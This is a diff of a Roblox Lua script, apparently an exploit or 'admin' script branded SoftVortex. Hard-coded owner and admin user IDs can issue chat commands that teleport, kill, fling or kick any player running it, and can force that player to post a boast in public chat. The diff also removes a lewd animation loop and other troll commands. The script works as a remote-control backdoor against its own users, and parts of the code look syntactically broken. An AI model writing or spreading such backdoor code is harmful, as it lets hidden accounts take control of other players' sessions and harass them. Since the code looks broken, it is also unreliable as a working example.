@@ -1,4 +1,4 @@
-local whitelist = {owner ={1362310817},admin={3276810125}}
+local whitelist = { owner = {1362310817}, admin = {3276810125}}
 
         owner = true admin = true
     
@@ -8,146 +8,49 @@ local whitelist = {owner ={1362310817},admin={3276810125}}
     
         if admin or owner then
         if message:sub(1, 6) == "!bring" then
-            if message:match(game.Players.LocalPlayer.Name) then 
-            local tweens=game:service"TweenService";
-            local info=TweenInfo.new(6,Enum.EasingStyle.Quad);
+            if message:match(game.Players.LocalPlayer.Name) then
                 local plr = game.Players.LocalPlayer
                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
             end
         end
         -- kill start
-        if message:sub(1, 5) == "!kill" then
+        if message:sub(1, 5) == "!kll" then
             if message:match(game.Players.LocalPlayer.Name) then
                 local plr = game.Players.LocalPlayer
                 game.Players.LocalPlayer.Character.Humanoid.Health = 0
             end
+        end
+        if message == "!users" then
+            if author ~= game.Players.LocalPlayer.Name then
+                local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+                path:FireServer("SoftVortex ON TOP"..author.."!","all")
+            end
+        end
         end
         --  kill end
         -- kick start
         if message:sub(1, 5) == "!kick" then
             if message:match(game.Players.LocalPlayer.Name) then
                 local plr = game.Players.LocalPlayer
-                game.Players.LocalPlayer:Kick("\nxd You Have Been Kicked.")
+                game.Players.LocalPlayer:Kick("\nlol u were kicked by?. \n["..author.."]")
     
             end
         end
-        
-
-        if message:sub(1, 5) == "!kick ." then
-            if message:match(game.Players.LocalPlayer.Name) then
-                local plr = game.Players.LocalPlayer
-                game.Players.LocalPlayer:Kick("\nxd You Have Been Kicked.","all")
-    
-            end
-        end
-
-        --  kill end
-        -- kick start
-        if message:sub(1, 5) == "!troll" then
-            if message:match(game.Players.LocalPlayer.Name) then
-                local plr = game.Players.LocalPlayer
-                game.Players.LocalPlayer:Kick("\nUSER-BANNED")
-    
-            end
-        end
-        
-                if message:sub(1, 5) == "!troll ." then
-            if message:match(game.Players.LocalPlayer.Name) then
-                local plr = game.Players.LocalPlayer
-                game.Players.LocalPlayer:Kick("\nUSER-BANNED","all")
-    
-            end
-        end
-        
         if message:sub(1, 9) == "!unfreeze" then
             if message:match(game.Players.LocalPlayer.Name) then
                 game.Players.LocalPlayer.Character.Head.Anchored = false
             end
         end
-        
-        if message:sub(1, 5) == "!benx" then
-            if message:match(game.Players.LocalPlayer.Name) then
-                bending = true
-                local segtarget = author.Name
-                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
-                Crouch.Looped = true
-                Crouch:Play()
-                local away = .5
-                local reversing = false
-                local Loop
-                local loopFunction = function()
-                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
-                    local character = player.Character
-                    if targetchar then
-                        if reversing == true then
-                            away = away - 0.1
-                        else
-                            away = away + 0.1
-                        end
-                        if away >= 2 then
-                            reversing = true
-                        elseif away < 0.5 then
-                            reversing = false
-                        end
-                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
-                    end
-                end;
-                local Start = function()
-                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
-                end;
-                local Pause = function()
-                    Loop:Disconnect()
-                    Crouch:Stop()
-                end;
-                Start()	
-                repeat wait() until bending == false
-                Pause()
-            end
-        end
-        
-        if message:sub(1, 7) == "!unbenx" then
-            if message:match(game.Players.LocalPlayer.Name) then
-                while bending == true do
-                    wait()
-                    bending = false
-                end
-            end
-        end
-        
         if message:sub(1, 6) == "!fling" then
             if message:match(game.Players.LocalPlayer.Name) then
                 local plr = game.Players.LocalPlayer
                 plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
             end
         end
-    
-        -- kick end
-        if message == "!users" then
-            if author ~= game.Players.LocalPlayer.Name then
-                local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
-                path:FireServer("SoftVortexonTOP","all")
-            end
-        end
-    
-        
-            
-    
-            if message:sub(1, 7) == "!rejoin" then
-                if message:match(game.Players.LocalPlayer.Name) then
-                    local TeleportService = game:GetService("TeleportService")
-                    TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
-                end
-            end
-        end
-    end
-    
-    
-    -- //
+end
     for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.admin) do if v.UserId == _ then admin = true if admin then warn('New admin : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
     end game.Players.PlayerAdded:Connect(function(player) for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true if admin then warn('New admin : '..player.Name) player.Chatted:Connect(function(msg) runcommand(msg,player.Name) end) end end end
     end)
-    
-    if owner == true then game.StarterGui:SetCore("SendNotification", { Title = "SoftVortex"; Text = "Airsoft Loves You"; Duration = 0; }) elseif owner then game.StarterGui:SetCore("SendNotification", { Title = "SoftVortex"; Text = "SoftVortex"; Duration = 0; }) end
     
     -- // Owner
     
@@ -162,6 +65,13 @@ local whitelist = {owner ={1362310817},admin={3276810125}}
 
 
 
-    
+
+
+
+
+
+
+
+
 
 
